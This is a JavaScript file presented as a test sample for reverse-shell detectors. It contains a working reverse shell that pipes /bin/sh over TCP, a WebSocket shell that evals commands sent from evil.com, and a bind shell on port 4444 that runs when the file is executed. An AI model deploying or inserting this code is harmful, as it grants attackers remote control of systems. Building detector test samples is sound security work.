// JavaScript Reverse Shell Test Sample
// This file contains patterns that should trigger reverse shell detection

const net = require('net');
const { spawn } = require('child_process');

// Classic reverse shell
function createReverseShell(host, port) {
    const client = net.connect(port, host, function() {
        console.log('Connected to server');
    });
    
    // Spawn shell process
    const shell = spawn('/bin/sh', [], {
        stdio: 'pipe'
    });
    
    // Pipe shell to network connection
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);
    
    client.on('error', (err) => {
        console.error('Connection error:', err);
    });
}

// Command execution via child process
function executeCommand(cmd) {
    const { exec } = require('child_process');
    
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error}`);
            return;
        }
        console.log(`Output: ${stdout}`);
        console.error(`Stderr: ${stderr}`);
    });
}

// WebSocket reverse shell (browser-based)
function webSocketShell() {
    if (typeof WebSocket !== 'undefined') {
        const ws = new WebSocket('ws://evil.com:8080');
        
        ws.onopen = function() {
            console.log('WebSocket connection established');
        };
        
        ws.onmessage = function(event) {
            const command = event.data;
            
            // Execute command (in a real browser environment)
            try {
                const result = eval(command);
                ws.send(JSON.stringify({ result: result }));
            } catch (error) {
                ws.send(JSON.stringify({ error: error.message }));
            }
        };
    }
}

// Network-based command execution
function networkCommandShell() {
    const server = net.createServer((socket) => {
        socket.on('data', (data) => {
            const command = data.toString().trim();
            
            if (command === 'exit') {
                socket.end();
                return;
            }
            
            executeCommand(command);
        });
    });
    
    server.listen(4444, '0.0.0.0', () => {
        console.log('Command server listening on port 4444');
    });
}

// Initialize reverse shell
if (process.argv.length > 2) {
    const host = process.argv[2] || '127.0.0.1';
    const port = parseInt(process.argv[3]) || 4444;
    createReverseShell(host, port);
} else {
    networkCommandShell();
}